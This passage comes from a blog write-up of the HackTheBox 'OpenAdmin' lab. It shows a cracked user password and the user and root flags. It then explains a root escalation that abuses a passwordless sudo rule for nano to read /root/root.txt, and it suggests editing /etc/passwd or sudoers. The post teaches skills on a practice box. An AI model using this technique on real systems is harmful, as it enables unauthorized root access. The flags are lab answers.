+</pre></table></code></div></div><p>and we found the password: “bloodninjas”. This enabled us log in as Joanna and gave us the user flag for this box</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>joanna@openadmin:~$ ls
+user.txt
+joanna@openadmin:~$ cat user.txt 
+c9b2cf07d40807e62af62660f0c81b5f
+</pre></table></code></div></div><h1 id="0x3-getting-the-roottxt">0x3 getting the root.txt</h1><p>This was acctually easier than getting the user, once you are logged in with joanna do:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>joanna@openadmin:~$ sudo -l                                                             
+Matching Defaults entries for joanna on openadmin:                                           
+    env_reset, mail_badpass,                                                                 
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
+                                                                                             
+User joanna may run the following commands on openadmin:                                           
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+</pre></table></code></div></div><p>you can open the /opt/priv with nano as root without getting prompted for a password, once you open nano on that file<br /> you can instruct nano to read the /root/root.txt, which since it runs as root it will do without complains.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>2f907ed450b361b2c2bf4e8795d5b561
+</pre></table></code></div></div><p>And that is it, instead of opening the root.txt you could also edit the /etc/passwd or the sudoers file to actually become a root user.<br /> At this point we have owned the box.<br /> This was my first Box on HTB and it won’t be the last!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox OpenAdmin - Marius Kimmina&url=https://mindslave.github.io/posts/HackTheBox-OpenAdmin/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox OpenAdmin - Marius Kimmina&u=https://mindslave.github.io/posts/HackTheBox-OpenAdmin/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox OpenAdmin - Marius Kimmina&url=https://mindslave.github.io/posts/HackTheBox-OpenAdmin/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HackTheBox_Feline/">HackTheBox Feline</a><li><a href="/posts/HackTheBox_Resolute/">HackTheBox Resolute</a><li><a href="/posts/HackTheBox_ServMon/">HackTheBox ServMon</a><li><a href="/posts/mwa_packing/">Malware Analysis - Packing</a><li><a href="/posts/mwa_globeImposter/">Malware Analysis - unpacking GlobeImposter Ransomware</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/36c3/">36C3</a> <a class="post-tag" href="/tags/malware/">Malware</a> <a class="post-tag" href="/tags/packing/">Packing</a> <a class="post-tag" href="/tags/bsd/">BSD</a> <a class="post-tag" href="/tags/cryptography/">Cryptography</a> <a class="post-tag" href="/tags/dll-injection/">dll injection</a> <a class="post-tag" href="/tags/docker/">docker</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackTheBox_Obscurity/"><div class="card-body"> <span class="timeago small" > May 9, 2020 <i class="unloaded">2020-05-09T08:10:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Obscurity</h3><div class="text-muted small"><p> 0x0 Introduction Yet another HackTheBox Box, this time it was all about obscure hidden stuff and reversing some custom crypto Definitely one of the more ctf-like boxes as this is (probably, you nev...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox_Feline/"><div class="card-body"> <span class="timeago small" > Mar 8 <i class="unloaded">2021-03-08T07:10:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Feline</h3><div class="text-muted small"><p> 0x0 Introduction The first hard box that I have ever pwned, so lets dive right into it. This box involved a java deserialization attack to first get an inital foothold, once we are on it we use a k...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox-Traverxec/"><div class="card-body"> <span class="timeago small" > Apr 11, 2020 <i class="unloaded">2020-04-11T08:10:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Traverxec</h3><div class="text-muted small"><p> 0x0 Introduction Yet another HTB box and again one of the easier ones. This time we had to exploit a vulnerable nostromo webserver version for command execution and then escalate privileges from th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HackTheBox-Traverxec/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox Traverxec</p></a> <a href="/posts/HackTheBox_Obscurity/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox Obscurity</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/Mindslave">Marius Kimmina</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/36c3/">36C3</a> <a class="post-tag" href="/tags/malware/">Malware</a> <a class="post-tag" href="/tags/packing/">Packing</a> <a class="post-tag" href="/tags/bsd/">BSD</a> <a class="post-tag" href="/tags/cryptography/">Cryptography</a> <a class="post-tag" href="/tags/dll-injection/">dll injection</a> <a class="post-tag" href="/tags/docker/">docker</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://mindslave.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
